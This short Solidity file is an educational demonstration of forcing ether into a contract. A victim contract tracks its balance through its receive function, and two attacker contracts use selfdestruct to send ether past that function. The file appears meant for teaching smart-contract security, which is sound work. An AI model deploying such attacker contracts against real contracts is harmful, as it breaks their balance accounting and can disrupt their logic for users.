// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// @title ForceEther
/// @notice Demonstrates forcing ether to any address
/// @dev Educational example - DO NOT USE IN PRODUCTION

/// @title Victim Contract
contract ForceEtherVictim {
    uint256 public balance;
    
    receive() external payable {
        balance += msg.value;
    }
}

/// @title Attacker that forces ether via selfdestruct
contract ForceEtherAttacker {
    /// @notice Force send ether via selfdestruct
    function attack(address payable _victim) external payable {
        require(msg.value > 0);
        selfdestruct(_victim);
    }
}

/// @title Another way - prefunded attacker
contract PrefundedAttacker {
    constructor() payable {}
    
    function destroy(address payable _recipient) external {
        selfdestruct(_recipient);
    }
}
